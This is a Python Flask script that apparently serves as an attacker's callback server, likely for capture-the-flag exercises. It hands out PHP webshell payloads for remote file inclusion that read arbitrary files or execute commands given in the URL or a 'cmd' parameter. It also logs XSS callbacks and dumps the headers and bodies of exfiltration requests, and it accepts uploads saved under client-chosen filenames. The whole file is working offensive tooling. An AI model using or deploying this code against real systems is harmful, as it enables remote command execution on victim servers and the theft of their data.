import os
from pathlib import Path

from flask import Flask, request

app = Flask(__name__)
UPLOAD_DIR = Path("uploads/")
UPLOAD_DIR.mkdir(exist_ok=True)

#for RFI
@app.route("/webshell/cat/<string:filename>/", defaults={"path": ""})
@app.route("/webshell/cat/<string:filename>/<path:path>")
def webshell_cat(filename, path):
	print("catting", filename)
	return "<?php echo file_get_contents(\"%s\") ?>" % filename

@app.route("/webshell/exec/<string:cmd>/", defaults={"path": ""})
@app.route("/webshell/exec/<string:cmd>/<path:path>")
def webshell_exec(cmd, path):
	print("execing", cmd)
	return "<?php echo exec(\"%s\") ?>" % cmd

@app.route("/webshell/exec2/", defaults={"path": ""})
@app.route("/webshell/exec2/<path:path>")
def webshell_exec2(path):
	return '<?php echo exec($_GET["cmd"]) ?>'

#for XSS
"""Usage: inject any of the payloads in xss_payloads.html
"""

@app.route("/xss/", defaults={"path": ""})
@app.route("/xss/<path:path>")
def xss(path):
	print("full url:", request.url)
	if path.endswith(".js"):
		return "void 0"
	elif path.endswith(".css"):
		return "*{}"
	return "success"

@app.route("/dump/", defaults={"path": ""}, methods=["GET", "POST"])
@app.route("/dump/<path:path>")
def dump(path):
	print("headers:", dict(request.headers))
	print("\ndata:", request.get_data())
	return "success"

@app.route("/upload", methods=["POST"])
def upload_file():
	print(dict(request.files))
	for file in request.files:
		filename = UPLOAD_DIR.joinpath("a").with_name(file.filename)
		print("Uploading", filename)
		file.save(filename)
	return "success"

@app.route("/")
def main():
	return "success"

def run():
	app.run(host="0.0.0.0", port=os.getenv("PORT") or 8000)

if __name__ == "__main__":
	run()